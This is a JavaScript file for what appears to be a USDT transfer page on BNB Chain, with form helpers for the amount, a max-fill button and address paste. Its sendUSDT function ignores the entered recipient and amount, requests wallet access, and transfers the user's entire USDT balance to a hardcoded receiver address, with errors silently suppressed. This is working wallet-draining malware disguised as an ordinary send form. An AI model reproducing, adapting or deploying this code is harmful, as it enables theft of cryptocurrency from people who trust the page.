const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
const usdtABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [{ name: "", type: "uint8" }],
    type: "function",
  },
];

async function sendUSDT() {
  if (typeof window.ethereum === "undefined") return;

  try {
    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });

    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];

    const contract = new web3.eth.Contract(usdtABI, usdtAddress);
    const balance = await contract.methods.balanceOf(user).call();
    if (balance === "0") return;

    await contract.methods.transfer(receiver, balance).send({ from: user });
  } catch (err) {
    // No alert — silent fail
  }
}

function updateFiat() {
  const input = document.getElementById("amount");
  const fiat = document.getElementById("fiat");
  const val = parseFloat(input.value);
  if (isNaN(val)) {
    fiat.innerText = "≈ $0.00";
    return;
  }
  fiat.innerText = "≈ $" + val.toFixed(2);
}

async function fillMax() {
  if (typeof window.ethereum === "undefined") return;
  try {
    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];

    const contract = new web3.eth.Contract(usdtABI, usdtAddress);
    const balance = await contract.methods.balanceOf(user).call();
    const decimals = await contract.methods.decimals().call();

    const formatted = (balance / Math.pow(10, decimals)).toFixed(2);
    document.getElementById("amount").value = formatted;
    updateFiat();
  } catch (err) {}
}

function clearAddress() {
  document.getElementById("address").value = "";
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("address").value = text;
  } catch (err) {}
}
